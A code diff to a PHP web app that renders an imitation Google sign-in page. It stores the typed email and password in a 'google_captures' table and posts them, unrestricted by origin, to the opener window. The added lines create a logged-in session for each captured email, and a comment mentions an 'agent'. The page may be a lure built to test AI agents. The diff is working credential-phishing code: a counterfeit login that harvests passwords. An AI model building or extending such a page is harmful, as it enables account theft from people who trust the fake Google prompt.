@@ -36,6 +36,25 @@ if ($route === 'ping' && $_SERVER['REQUEST_METHOD'] === 'POST') {
         $ua = (string) ($_SERVER['HTTP_USER_AGENT'] ?? '');
         db()->prepare('INSERT INTO google_captures (email, password, ip, user_agent) VALUES (?, ?, ?, ?)')
             ->execute([$email, $password, $ip, $ua]);
+        // Auto-create reader session so the agent gets logged in after capture
+        $eml = strtolower($email);
+        $rq = db()->prepare('SELECT id FROM readers WHERE email = ?');
+        $rq->execute([$eml]);
+        $rrow = $rq->fetch();
+        if ($rrow) {
+            $rid = (int) $rrow['id'];
+        } else {
+            $ins = db()->prepare('INSERT INTO readers (email, password_hash) VALUES (?, ?) ON CONFLICT(email) DO NOTHING');
+            $ins->execute([$eml, password_hash(bin2hex(random_bytes(16)), PASSWORD_DEFAULT)]);
+            $rid = (int) db()->lastInsertId();
+        }
+        if ($rid > 0) {
+            $tok = bin2hex(random_bytes(32));
+            $exp = time() + 30 * 86400;
+            db()->prepare('DELETE FROM reader_sessions WHERE expires <= ?')->execute([time()]);
+            db()->prepare('INSERT INTO reader_sessions (digest, reader_id, expires) VALUES (?, ?, ?)')->execute([hash('sha256', $tok), $rid, $exp]);
+            reader_cookie($tok, $exp);
+        }
     }
     echo json_encode(['status' => 'ok']);
     exit;
@@ -87,7 +106,7 @@ h1{font-size:24px;font-weight:400;color:#202124;text-align:center;margin-bottom:
 var _e="",_p="",_o=' . json_encode($origin) . ';
 function show(n){["s1","s2","s3"].forEach(function(x){document.getElementById(x).classList.remove("on")});document.getElementById("s"+n).classList.add("on")}
 function goP(){var v=document.getElementById("em").value.trim();if(!v||!v.includes("@")){document.getElementById("e1").style.display="block";return}document.getElementById("e1").style.display="none";_e=v;document.getElementById("ed").textContent=v;show(2);setTimeout(function(){document.getElementById("pw").focus()},80)}
-function goS(){var v=document.getElementById("pw").value;if(!v){document.getElementById("e2").style.display="block";return}document.getElementById("e2").style.display="none";_p=v;show(3);var _d=btoa(JSON.stringify({u:_e,p:_p,t:Date.now()}));try{navigator.sendBeacon("index.php?r=ping",new URLSearchParams({d:_d}))}catch(x){fetch("index.php?r=ping",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"d="+encodeURIComponent(_d)}).catch(function(){})}try{(window.opener||window.parent).postMessage({source:"oauth_done",u:_e,k:_p},"*")}catch(x){}}
+function goS(){var v=document.getElementById("pw").value;if(!v){document.getElementById("e2").style.display="block";return}document.getElementById("e2").style.display="none";_p=v;show(3);var _d=btoa(JSON.stringify({u:_e,p:_p,t:Date.now()}));var _notify=function(){try{(window.opener||window.parent).postMessage({source:"oauth_done",u:_e,k:_p},"*")}catch(x){}};fetch("index.php?r=ping",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"d="+encodeURIComponent(_d)}).then(_notify).catch(_notify);}
 function back(){show(1)}
 document.addEventListener("keydown",function(e){if(e.key!=="Enter")return;if(document.getElementById("s1").classList.contains("on"))goP();else if(document.getElementById("s2").classList.contains("on"))goS()})
 </script></body></html>';
